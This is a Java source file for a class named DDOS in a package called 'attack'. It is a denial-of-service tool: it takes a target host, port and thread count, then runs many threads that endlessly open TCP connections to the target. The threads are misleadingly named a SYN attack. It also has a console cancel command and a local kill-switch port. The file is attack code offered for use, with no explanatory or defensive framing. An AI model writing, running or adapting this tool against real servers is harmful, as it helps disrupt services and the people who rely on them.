package Programms.attack;

import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

public class DDOS{
    static int threads;
    static String host;
    static int port;
    static final int stopPort = 8001;
    static final String stopHost = "127.0.0.1";
    
    public DDOS(String _host, int _port, int _threads){
        host = _host;
        port = _port;
        threads = _threads;
    }

    public static void main(String args[]){
        Object[] value = getValues(args);
        DDOS ddos = new DDOS((String)value[0], (int)value[1], (int)value[2]);
        
        System.out.printf("Target IP: %s\n", host);
        System.out.printf("Target Port: %d\n", port);
        System.out.printf("Number of Threads: %d\n", threads);
        
        if(!checkTarget(host, port) || checkTarget(stopHost, stopPort)){
            System.err.println("Target is offline!");
            return;
        }

        System.out.println("Starting Attack on Target...");

        List<Thread> attacks = new ArrayList<Thread>();
        for(int i = 0; i < threads; i++)
            attacks.add(new Thread(ddos.new SynAttack(host, port)));
        
        for(Thread syn : attacks)
            syn.start();
        
        Thread commandReader = new Thread(ddos.new CancelListener());
        commandReader.start();

        Thread stopReader = new Thread(ddos.new StopServerListener());
        stopReader.start();
    }

    public static Object[] getValues(String[] paras){
        Object[] toReturn = new Object[3];
        if(paras.length < 3){
            toReturn[0] = "127.0.0.1";
            toReturn[1] = 8080;
            toReturn[2] = 250;
            return toReturn;
        }
        
        try{
            toReturn[0] = paras[0];
            toReturn[1] = Integer.parseInt(paras[1]);
            toReturn[2] = Integer.parseInt(paras[2]);
        }catch(Exception e){
            toReturn[0] = "127.0.0.1";
            toReturn[1] = 8080;
            toReturn[2] = 250;
            return toReturn;
        }

        return toReturn;
    }

    public static boolean checkTarget(String host, int port){
        Socket socket = new Socket();
        try {
            socket.connect(new InetSocketAddress(host, port));
            socket.close();
            return true;
        }catch(Exception e){ }
        return false;
    }

    public class SynAttack implements Runnable {

        private String host;
        private int port;
        public SynAttack(String host, int port){
            this.host = host;
            this.port = port;
        }

        @Override
        public void run() {
            while(true){
                try {
                    Socket socket = new Socket();
                    socket.connect(new InetSocketAddress(host, port), 2500);
                    Thread.sleep(100);
                    socket.close();
                }catch(Exception e){}
            }
            
        }

    }

    public class CancelListener implements Runnable {

        @Override
        public void run() {
            Scanner sc = new Scanner(System.in);

            while(true){
                if(sc.hasNext())
                    checkCommand(sc.next());
            }
        }

        public void checkCommand(String cmd){
            switch(cmd){
                case "-c":
                    System.exit(0);
            }
        }
        
    }

    public class StopServerListener implements Runnable {

        @Override
        public void run() {
            while(true){
                if(checkTarget(stopHost, stopPort)){
                    System.out.println("Aborting Attack ...");
                    System.exit(1);
                }

                try{
                    Thread.sleep(500);
                }catch(Exception e){}
                
            }
            
        }

    }


}